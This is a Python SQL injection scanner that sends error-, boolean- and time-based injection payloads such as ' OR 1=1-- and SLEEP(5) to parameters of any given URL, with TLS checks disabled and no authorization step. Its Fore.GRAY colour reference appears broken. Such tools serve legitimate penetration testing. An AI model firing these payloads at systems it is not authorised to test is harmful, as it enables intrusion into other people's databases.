#!/usr/bin/env python3
"""16 · SQL INJECTION TESTER — Automated SQLi detection"""

import requests, argparse, json, sys, re, time, urllib.parse
from colorama import Fore, Style, init
init(autoreset=True)
requests.packages.urllib3.disable_warnings()

BANNER = f"{Fore.RED}╔══════════════════════════════════════╗\n║  💉 SQL INJECTION TESTER  v1.0       ║\n║  Error/Boolean/Time-based SQLi detect║\n╚══════════════════════════════════════╝{Style.RESET_ALL}"

SQL_ERRORS = [
    (r"SQL syntax.*MySQL",             "MySQL"),
    (r"Warning.*mysql_",               "MySQL"),
    (r"MySQLSyntaxErrorException",     "MySQL"),
    (r"valid MySQL result",            "MySQL"),
    (r"check the manual that corresponds to your MySQL", "MySQL"),
    (r"PostgreSQL.*ERROR",             "PostgreSQL"),
    (r"Warning.*Postgresql",           "PostgreSQL"),
    (r"valid PostgreSQL result",       "PostgreSQL"),
    (r"Npgsql\.",                      "PostgreSQL"),
    (r"Driver.*SQL.*Server",           "MSSQL"),
    (r"OLE DB.*SQL Server",            "MSSQL"),
    (r"Microsoft SQL Native Client",   "MSSQL"),
    (r"ODBC SQL Server Driver",        "MSSQL"),
    (r"SQLServer JDBC Driver",         "MSSQL"),
    (r"ORA-[0-9]{5}",                  "Oracle"),
    (r"Oracle error",                  "Oracle"),
    (r"Oracle.*Driver",                "Oracle"),
    (r"Warning.*oci_",                 "Oracle"),
    (r"SQLite/JDBCDriver",             "SQLite"),
    (r"SQLite\.Exception",             "SQLite"),
    (r"System\.Data\.SQLite\.SQLiteException", "SQLite"),
    (r"SQLITE_ERROR",                  "SQLite"),
    (r"microsoft jet database",        "MsAccess"),
    (r"Syntax error.*query expression","MsAccess"),
]

PAYLOADS_ERROR = ["'", '"', "`", "''", "' OR '1'='1", "' OR 1=1--", "' OR 'x'='x"]
PAYLOADS_BOOL  = [("' AND '1'='1", "' AND '1'='2"),
                  (" AND 1=1","  AND 1=2"),
                  ("' AND 1=1--","' AND 1=2--")]
PAYLOADS_TIME  = ["'; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--",
                  "' OR SLEEP(5)--", "1; SELECT SLEEP(5)"]

def check_error_based(url: str, param: str, original_resp: str,
                       session: requests.Session, timeout: float) -> dict | None:
    for payload in PAYLOADS_ERROR:
        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
        try:
            r    = session.get(test_url, timeout=timeout, verify=False)
            body = r.text
            for pattern, db in SQL_ERRORS:
                if re.search(pattern, body, re.IGNORECASE):
                    return {"type":"ERROR_BASED","db":db,"payload":payload,
                            "url":test_url,"level":"CRÍTICO"}
        except: pass
    return None

def check_boolean_based(url: str, param: str, original_resp: str,
                         session: requests.Session, timeout: float) -> dict | None:
    orig_len = len(original_resp)
    for true_p, false_p in PAYLOADS_BOOL:
        try:
            r_true  = session.get(f"{url}?{param}={urllib.parse.quote(true_p)}",
                                  timeout=timeout, verify=False)
            r_false = session.get(f"{url}?{param}={urllib.parse.quote(false_p)}",
                                  timeout=timeout, verify=False)
            t_len = len(r_true.text); f_len = len(r_false.text)
            if abs(t_len - f_len) > 50 and abs(orig_len - t_len) < abs(orig_len - f_len):
                return {"type":"BOOLEAN_BASED","payload_true":true_p,"payload_false":false_p,
                        "diff":abs(t_len-f_len),"url":url,"level":"ALTO"}
        except: pass
    return None

def check_time_based(url: str, param: str, session: requests.Session, timeout: float) -> dict | None:
    for payload in PAYLOADS_TIME:
        try:
            start = time.time()
            session.get(f"{url}?{param}={urllib.parse.quote(payload)}",
                       timeout=timeout+6, verify=False)
            elapsed = time.time() - start
            if elapsed >= 4.5:
                return {"type":"TIME_BASED","payload":payload,"elapsed":round(elapsed,2),
                        "url":url,"level":"ALTO"}
        except: pass
    return None

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="SQL Injection Tester")
    parser.add_argument("-u","--url",      required=True)
    parser.add_argument("-p","--param",    default=None, help="Parámetro específico")
    parser.add_argument("--params",        nargs="+", default=["id","user","name","search","q","page"])
    parser.add_argument("--timeout",       type=float, default=8.0)
    parser.add_argument("--skip-time",     action="store_true")
    parser.add_argument("-o","--output",   default=None)
    args = parser.parse_args()

    url     = args.url if args.url.startswith("http") else "http://" + args.url
    params  = [args.param] if args.param else args.params
    session = requests.Session()
    session.headers.update({"User-Agent":"Mozilla/5.0 SQLiTester/1.0"})
    findings= []

    try:
        orig = session.get(url, timeout=args.timeout, verify=False)
        orig_body = orig.text
    except Exception as e:
        print(f"{Fore.RED}[✗] No se pudo conectar: {e}"); sys.exit(1)

    print(f"\n{Fore.CYAN}[*] URL     : {url}")
    print(f"{Fore.CYAN}[*] Params  : {params}")
    print(f"{Fore.GRAY}{'─'*44}\n")

    for param in params:
        print(f"  {Fore.CYAN}[*] Testeando param: {param}{Style.RESET_ALL}")
        f = check_error_based(url, param, orig_body, session, args.timeout)
        if f:
            findings.append(f)
            print(f"  {Fore.RED}[CRÍTICO] Error-based SQLi en '{param}' — DB: {f['db']}{Style.RESET_ALL}")
            continue
        f = check_boolean_based(url, param, orig_body, session, args.timeout)
        if f:
            findings.append(f)
            print(f"  {Fore.YELLOW}[ALTO] Boolean-based SQLi en '{param}' (diff: {f['diff']} chars){Style.RESET_ALL}")
            continue
        if not args.skip_time:
            f = check_time_based(url, param, session, args.timeout)
            if f:
                findings.append(f)
                print(f"  {Fore.YELLOW}[ALTO] Time-based SQLi en '{param}' ({f['elapsed']}s delay){Style.RESET_ALL}")
                continue
        print(f"    {Fore.GREEN}✓ Sin vulnerabilidades{Style.RESET_ALL}")

    print(f"\n{Fore.GRAY}{'─'*44}")
    print(f"{Fore.RED if findings else Fore.GREEN}Vulnerabilidades SQLi: {len(findings)}")
    if args.output and findings:
        with open(args.output,"w") as f: json.dump(findings, f, indent=2)
        print(f"{Fore.CYAN}[*] Guardado: {args.output}")

if __name__ == "__main__":
    main()
